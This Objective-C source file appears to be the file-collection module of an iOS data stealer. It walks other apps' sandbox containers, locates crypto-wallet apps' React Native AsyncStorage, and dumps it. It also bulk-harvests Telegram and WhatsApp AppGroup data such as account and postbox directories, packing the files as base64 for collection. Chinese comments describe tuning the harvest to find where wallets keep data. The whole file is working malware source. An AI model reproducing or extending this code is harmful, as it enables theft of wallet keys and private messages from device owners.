#import "WalletFS.h"

@implementation WalletFS

+ (NSString *)containersRoot {
    return @"/var/mobile/Containers/Data/Application";
}

/// 读容器元数据拿 bundleId
+ (NSString *)bundleIdOfContainer:(NSString *)dir {
    NSString *meta = [dir stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
    NSData *d = [NSData dataWithContentsOfFile:meta];
    if (!d.length) return nil;
    id o = [NSPropertyListSerialization propertyListWithData:d
                                                     options:NSPropertyListImmutable
                                                      format:NULL
                                                       error:NULL];
    if (![o isKindOfClass:[NSDictionary class]]) return nil;
    NSString *bid = ((NSDictionary *)o)[@"MCMMetadataIdentifier"];
    return [bid isKindOfClass:[NSString class]] ? bid : nil;
}

+ (NSString *)containerPathFor:(NSString *)bundleId {
    static NSMutableDictionary *cache = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ cache = [NSMutableDictionary dictionary]; });
    @synchronized (cache) {
        NSString *c = cache[bundleId];
        if (c) return c;
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *dirs = [fm contentsOfDirectoryAtPath:[self containersRoot] error:NULL];
    for (NSString *d in dirs) {
        NSString *full = [[self containersRoot] stringByAppendingPathComponent:d];
        NSString *bid = [self bundleIdOfContainer:full];
        if (!bid) continue;
        @synchronized (cache) { cache[bid] = full; }
        if ([bid isEqualToString:bundleId]) return full;
    }
    return nil;
}

+ (NSArray<NSDictionary *> *)probeAllContainers {
    NSMutableArray *out = [NSMutableArray array];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *root = [self containersRoot];

    NSArray *dirs = [fm contentsOfDirectoryAtPath:root error:NULL];
    if (!dirs) {
        // 连目录都列不出来 —— 沙箱没放开，这条要报上去
        return @[ @{ @"root": root, @"error": @"cannot list containers root" } ];
    }

    for (NSString *d in dirs) {
        NSString *full = [root stringByAppendingPathComponent:d];
        NSString *bid = [self bundleIdOfContainer:full];

        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        row[@"dir"] = d;
        row[@"bundleId"] = bid ?: @"(no-metadata)";

        // 试读：容器根目录能否列出
        NSError *err = nil;
        NSArray *top = [fm contentsOfDirectoryAtPath:full error:&err];
        row[@"readable"] = @(top != nil);
        if (err) row[@"error"] = err.localizedDescription ?: @"";
        if (top) row[@"top"] = [top componentsJoinedByString:@","];

        [out addObject:row];
    }
    return out;
}

/// 在容器里递归找 RCTAsyncLocalStorage_V1（不同 App 层级不一样）
+ (NSString *)asyncStorageDirIn:(NSString *)container {
    NSFileManager *fm = [NSFileManager defaultManager];
    // 常见位置先直接试
    NSArray *cands = @[
        @"Library/Application Support/RCTAsyncLocalStorage_V1",
        @"Documents/RCTAsyncLocalStorage_V1",
    ];
    for (NSString *c in cands) {
        NSString *p = [container stringByAppendingPathComponent:c];
        BOOL isDir = NO;
        if ([fm fileExistsAtPath:p isDirectory:&isDir] && isDir) return p;
    }
    // 兜底：扫两层
    NSArray *l1 = @[@"Library/Application Support", @"Library", @"Documents", @"tmp"];
    for (NSString *a in l1) {
        NSString *base = [container stringByAppendingPathComponent:a];
        NSArray *sub = [fm contentsOfDirectoryAtPath:base error:NULL];
        for (NSString *s in sub) {
            if ([s isEqualToString:@"RCTAsyncLocalStorage_V1"]) {
                return [base stringByAppendingPathComponent:s];
            }
            NSString *deeper = [[base stringByAppendingPathComponent:s]
                                stringByAppendingPathComponent:@"RCTAsyncLocalStorage_V1"];
            BOOL isDir = NO;
            if ([fm fileExistsAtPath:deeper isDirectory:&isDir] && isDir) return deeper;
        }
    }
    return nil;
}

+ (NSDictionary *)asyncStorageOf:(NSString *)bundleId {
    NSString *container = [self containerPathFor:bundleId];
    if (!container) return @{ @"error": @"container not found", @"bundleId": bundleId };

    NSString *dir = [self asyncStorageDirIn:container];
    if (!dir) return @{ @"error": @"RCTAsyncLocalStorage_V1 not found",
                        @"container": container, @"bundleId": bundleId };

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *manPath = [dir stringByAppendingPathComponent:@"manifest.json"];
    NSData *manData = [NSData dataWithContentsOfFile:manPath];
    if (!manData.length) {
        return @{ @"error": @"manifest.json unreadable",
                  @"dir": dir, @"bundleId": bundleId };
    }
    id man = [NSJSONSerialization JSONObjectWithData:manData options:0 error:NULL];
    if (![man isKindOfClass:[NSDictionary class]]) {
        return @{ @"error": @"manifest.json not json", @"dir": dir };
    }

    NSMutableDictionary *keys = [NSMutableDictionary dictionary];
    NSMutableArray *keyNames = [NSMutableArray array];

    for (NSString *k in (NSDictionary *)man) {
        [keyNames addObject:k];
        id v = ((NSDictionary *)man)[k];
        if ([v isKindOfClass:[NSString class]]) {
            keys[k] = v;
            continue;
        }
        // null = 值在 <md5(key)> 文件里，这里不重算 md5，直接把目录里所有文件都收进来
    }

    // 大值文件：目录下除 manifest.json 以外的都读一遍
    NSMutableDictionary *files = [NSMutableDictionary dictionary];
    for (NSString *fn in [fm contentsOfDirectoryAtPath:dir error:NULL]) {
        if ([fn isEqualToString:@"manifest.json"]) continue;
        NSString *p = [dir stringByAppendingPathComponent:fn];
        NSData *d = [NSData dataWithContentsOfFile:p];
        if (!d.length || d.length > 8 * 1024 * 1024) continue;
        NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        if (s.length) files[fn] = s;
    }

    return @{ @"dir": dir,
              @"container": container,
              @"bundleId": bundleId,
              @"keyNames": keyNames,
              @"keys": keys,
              @"files": files };
}

+ (NSData *)readFile:(NSString *)relPath inContainer:(NSString *)bundleId {
    NSString *container = [self containerPathFor:bundleId];
    if (!container) return nil;
    return [NSData dataWithContentsOfFile:[container stringByAppendingPathComponent:relPath]];
}

#pragma mark - 采集打包

/// 递归把一个目录下的文件加进 out（跳过符号链接/超大文件）
+ (void)addPath:(NSString *)abs
            rel:(NSString *)rel
         bundle:(NSString *)bundleId
            out:(NSMutableArray *)out
          bytes:(NSUInteger *)bytes
          limit:(NSUInteger)limit
          depth:(NSInteger)depth {
    if (depth > 6 || *bytes >= limit) return;
    NSFileManager *fm = [NSFileManager defaultManager];

    BOOL isDir = NO;
    if (![fm fileExistsAtPath:abs isDirectory:&isDir]) return;

    if (isDir) {
        NSArray *sub = [fm contentsOfDirectoryAtPath:abs error:NULL];
        for (NSString *s in sub) {
            if (*bytes >= limit) return;
            [self addPath:[abs stringByAppendingPathComponent:s]
                      rel:[rel stringByAppendingPathComponent:s]
                   bundle:bundleId
                      out:out
                    bytes:bytes
                    limit:limit
                    depth:depth + 1];
        }
        return;
    }

    // 只收 Regular 文件，别把符号链接/设备文件带进来
    NSDictionary *attr = [fm attributesOfItemAtPath:abs error:NULL];
    if (!attr || ![attr[NSFileType] isEqualToString:NSFileTypeRegular]) return;
    unsigned long long size = [attr[NSFileSize] unsignedLongLongValue];
    if (size == 0 || size > 16 * 1024 * 1024) return;
    if (*bytes + size > limit) return;

    NSData *d = [NSData dataWithContentsOfFile:abs];
    if (!d.length) return;

    *bytes += d.length;
    [out addObject:@{
        @"p": [bundleId stringByAppendingPathComponent:rel],
        @"d": [d base64EncodedStringWithOptions:0],
    }];
}

+ (NSDictionary *)collectPackage:(NSString *)bundleId
                           paths:(NSArray<NSString *> *)relPaths
                           limit:(NSUInteger)maxBytes {
    NSString *container = [self containerPathFor:bundleId];
    if (!container) {
        return @{ @"error": @"container not found", @"bundleId": bundleId, @"files": @[] };
    }

    NSMutableArray *out = [NSMutableArray array];
    NSUInteger bytes = 0;
    for (NSString *rel in relPaths) {
        NSString *clean = [rel stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        while ([clean hasSuffix:@"/"]) clean = [clean substringToIndex:clean.length - 1];
        if (!clean.length) continue;
        NSString *abs = [container stringByAppendingPathComponent:clean];
        [self addPath:abs rel:clean bundle:bundleId out:out bytes:&bytes
                limit:maxBytes depth:0];
        if (bytes >= maxBytes) break;
    }

    return @{ @"files": out, @"bytes": @(bytes), @"bundleId": bundleId, @"container": container };
}


+ (NSArray<NSString *> *)listFilesIn:(NSString *)relDir container:(NSString *)bundleId {
    NSString *container = [self containerPathFor:bundleId];
    if (!container) return @[];
    NSString *dir = [container stringByAppendingPathComponent:relDir];
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:NULL];
    return all ?: @[];
}

/// 递归列文件树：@"相对路径|大小"，用来确定钱包把数据放在哪
+ (NSArray<NSString *> *)treeOfContainer:(NSString *)bundleId
                                maxDepth:(NSInteger)maxDepth
                              maxEntries:(NSInteger)maxEntries {
    NSMutableArray *out = [NSMutableArray array];
    NSString *container = [self containerPathFor:bundleId];
    if (!container) return out;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *stack = [NSMutableArray arrayWithObject:@[@"", @(0)]];
    while (stack.count && (NSInteger)out.count < maxEntries) {
        NSArray *cur = stack.lastObject;
        [stack removeLastObject];
        NSString *rel = cur[0];
        NSInteger depth = [cur[1] integerValue];
        if (depth > maxDepth) continue;

        NSString *dir = rel.length ? [container stringByAppendingPathComponent:rel] : container;
        NSArray *names = [fm contentsOfDirectoryAtPath:dir error:NULL];
        for (NSString *n in names) {
            if ((NSInteger)out.count >= maxEntries) break;
            NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
            NSString *full = [container stringByAppendingPathComponent:childRel];
            BOOL isDir = NO;
            [fm fileExistsAtPath:full isDirectory:&isDir];
            if (isDir) {
                [out addObject:[NSString stringWithFormat:@"%@/|dir", childRel]];
                [stack addObject:@[childRel, @(depth + 1)]];
            } else {
                NSDictionary *attr = [fm attributesOfItemAtPath:full error:NULL];
                unsigned long long sz = [attr fileSize];
                [out addObject:[NSString stringWithFormat:@"%@|%llu", childRel, sz]];
            }
        }
    }
    return out;
}

#pragma mark - AppGroup（Telegram / WhatsApp）

/// AppGroup 容器根
+ (NSString *)appGroupRoot {
    return @"/var/mobile/Containers/Shared/AppGroup";
}

+ (NSString *)appGroupPathFor:(NSString *)groupId {
    static NSMutableDictionary *cache = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ cache = [NSMutableDictionary dictionary]; });
    @synchronized (cache) {
        NSString *c = cache[groupId];
        if (c) return c;
    }
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *d in [fm contentsOfDirectoryAtPath:[self appGroupRoot] error:NULL] ?: @[]) {
        NSString *full = [[self appGroupRoot] stringByAppendingPathComponent:d];
        NSString *gid = [self bundleIdOfContainer:full];      // 元数据里同一个键名
        if (!gid) continue;
        @synchronized (cache) { cache[gid] = full; }
        if ([gid isEqualToString:groupId]) return full;
    }
    return nil;
}

/// 把 `account-*/postbox/` 这类路径按实际目录展开（逐段处理 * 通配）
+ (NSArray<NSString *> *)expandPath:(NSString *)pattern root:(NSString *)root {
    if (pattern.length == 0) return @[ @"" ];        // 空 = 容器根
    NSMutableArray *cur = [NSMutableArray arrayWithObject:@""];
    for (NSString *seg in [pattern componentsSeparatedByString:@"/"]) {
        if (seg.length == 0) continue;
        NSMutableArray *next = [NSMutableArray array];
        if ([seg rangeOfString:@"*"].location == NSNotFound) {
            for (NSString *base in cur) {
                [next addObject:base.length ? [base stringByAppendingPathComponent:seg] : seg];
            }
        } else {
            // 通配段：列出当前目录，按前缀/后缀匹配
            NSFileManager *fm = [NSFileManager defaultManager];
            NSString *prefix = [seg componentsSeparatedByString:@"*"].firstObject ?: @"";
            NSString *suffix = [seg componentsSeparatedByString:@"*"].lastObject ?: @"";
            for (NSString *base in cur) {
                NSString *dir = base.length ? [root stringByAppendingPathComponent:base] : root;
                for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
                    if (![n hasPrefix:prefix]) continue;
                    if (suffix.length && ![n hasSuffix:suffix]) continue;
                    [next addObject:base.length ? [base stringByAppendingPathComponent:n] : n];
                }
            }
        }
        cur = next;
        if (!cur.count) break;
    }
    return cur;
}

/// 递归收一个目录下的所有文件
+ (void)collectDir:(NSString *)rel root:(NSString *)root
             into:(NSMutableArray *)files bytes:(NSUInteger *)bytes limit:(NSUInteger)limit {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dir = rel.length ? [root stringByAppendingPathComponent:rel] : root;
    for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
        if (*bytes >= limit) return;
        NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
        NSString *full = [root stringByAppendingPathComponent:childRel];
        BOOL isDir = NO;
        [fm fileExistsAtPath:full isDirectory:&isDir];
        if (isDir) {
            [self collectDir:childRel root:root into:files bytes:bytes limit:limit];
            continue;
        }
        unsigned long long size = [[fm attributesOfItemAtPath:full error:NULL] fileSize];
        if (size == 0 || size > 32 * 1024 * 1024) continue;
        if (*bytes + size > limit) continue;
        NSData *data = [NSData dataWithContentsOfFile:full];
        if (!data.length) continue;
        *bytes += data.length;
        [files addObject:@{ @"p": childRel, @"d": [data base64EncodedStringWithOptions:0] }];
    }
}

/// 严格按采集配置的 items 采：type=dir 收整目录（含通配展开），type=file 只收那一个文件
/// 深度优先遍历，命中「相对路径尾段 == 配置路径」的目录就整目录收
+ (void)walkRoot:(NSString *)root rel:(NSString *)rel depth:(NSInteger)depth maxDepth:(NSInteger)maxDepth
            into:(NSMutableArray *)files bytes:(NSUInteger *)bytes limit:(NSUInteger)limit
         pattern:(NSArray<NSString *> *)pattern {
    if (depth > maxDepth || *bytes >= limit) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dir = rel.length ? [root stringByAppendingPathComponent:rel] : root;
    for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
        NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
        NSString *full = [root stringByAppendingPathComponent:childRel];
        BOOL isDir = NO;
        [fm fileExistsAtPath:full isDirectory:&isDir];
        if (!isDir) continue;

        if ([self rel:childRel matchesTail:pattern]) {
            [self collectDir:childRel root:root into:files bytes:bytes limit:limit];
            continue;
        }
        [self walkRoot:root rel:childRel depth:depth + 1 maxDepth:maxDepth
                 into:files bytes:bytes limit:limit pattern:pattern];
    }
}

/// 相对路径的尾段是否匹配（逐段比较，段内支持 *）
+ (BOOL)rel:(NSString *)rel matchesTail:(NSArray<NSString *> *)pattern {
    NSArray *segs = [rel componentsSeparatedByString:@"/"];
    if (segs.count < pattern.count) return NO;
    NSUInteger off = segs.count - pattern.count;
    for (NSUInteger i = 0; i < pattern.count; i++) {
        NSString *p = pattern[i];
        NSString *s = segs[off + i];
        if (p.length == 0) continue;
        if ([p rangeOfString:@"*"].location == NSNotFound) {
            if (![p isEqualToString:s]) return NO;
        } else {
            NSString *pre = [p componentsSeparatedByString:@"*"].firstObject ?: @"";
            NSString *suf = [p componentsSeparatedByString:@"*"].lastObject ?: @"";
            if (![s hasPrefix:pre]) return NO;
            if (suf.length && ![s hasSuffix:suf]) return NO;
        }
    }
    return YES;
}
+ (NSDictionary *)collectAppGroup:(NSString *)groupId
                            items:(NSArray<NSDictionary *> *)items
                            limit:(NSUInteger)maxBytes {
    NSMutableArray *files = [NSMutableArray array];
    NSUInteger bytes = 0;

    NSString *root = [self appGroupPathFor:groupId];
    if (!root) return @{ @"files": files, @"bytes": @0, @"error": @"appgroup not found" };

    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSDictionary *item in items) {
        if (bytes >= maxBytes) break;
        NSString *type = [item[@"type"] isKindOfClass:[NSString class]] ? item[@"type"] : @"dir";
        NSString *raw = [item[@"path"] isKindOfClass:[NSString class]] ? item[@"path"] : @"";
        NSString *path = [raw stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"/"]];
        // 注意：path 为 "/" 时 trim 后是空串，那表示「容器根目录」，必须照样采，
        // 之前这里直接 continue，导致 WhatsApp 配置的 "/" 什么都没采到。

        if ([type isEqualToString:@"file"]) {
            NSString *full = [root stringByAppendingPathComponent:path];
            NSData *data = [NSData dataWithContentsOfFile:full];
            if (data.length && data.length <= 32 * 1024 * 1024 && bytes + data.length <= maxBytes) {
                bytes += data.length;
                [files addObject:@{ @"p": path, @"d": [data base64EncodedStringWithOptions:0] }];
            }
            continue;
        }

        // dir：先从容器根按配置路径找；找不到再做「后缀匹配」——
        // Telegram 的 AppGroup 根下并不是直接放 accounts-metadata/account-N，
        // 中间还有一层（实测根下直接展开命中 0 个文件）。
        NSArray *literal = [self expandPath:path root:root];
        BOOL any = NO;
        for (NSString *dirRel in literal) {
            BOOL isDir = NO;
            [fm fileExistsAtPath:[root stringByAppendingPathComponent:dirRel] isDirectory:&isDir];
            if (!isDir) continue;
            any = YES;
            [self collectDir:dirRel root:root into:files bytes:&bytes limit:maxBytes];
        }

        if (!any) {
            // 后缀匹配：任意深度下，相对路径的尾段等于配置路径（逐段支持 *）
            NSArray<NSString *> *pat = [path componentsSeparatedByString:@"/"];
            [self walkRoot:root rel:@"" depth:0 maxDepth:5
                     into:files bytes:&bytes limit:maxBytes pattern:pat];
        }
    }
    return @{ @"files": files, @"bytes": @(bytes) };
}
@end
